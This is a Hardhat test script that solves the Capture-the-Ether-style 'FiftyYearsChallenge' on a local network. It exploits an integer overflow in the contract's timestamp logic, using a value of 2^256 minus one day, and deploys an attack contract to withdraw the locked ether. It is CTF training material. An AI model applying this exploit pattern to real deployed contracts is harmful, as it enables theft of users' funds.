import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const { utils } = ethers;

describe("FiftyYearsChallenge", () => {
  it("Solves the challenge", async () => {
    const [owner] = await ethers.getSigners();
    const TargetFactory = await ethers.getContractFactory("FiftyYearsChallenge");
    const target = await TargetFactory.deploy(owner.address, {
      value: utils.parseEther("1"),
    });
    await target.deployed();

    const PRE_OVERFLOW = BigNumber.from(2)
      .pow(256)
      .sub(24 * 60 * 60);

    let tx;
    tx = await target.upsert(1, PRE_OVERFLOW, { value: 1 });
    await tx.wait();

    tx = await target.upsert(2, 0, { value: 2 });
    await tx.wait();

    const AttackFactory = await ethers.getContractFactory("FiftyYearsAttack");
    const attack = await AttackFactory.deploy(target.address, { value: 2 });
    await attack.deployed();

    tx = await target.withdraw(2);
    await tx.wait();

    expect(await target.isComplete()).to.be.true;
  });
});
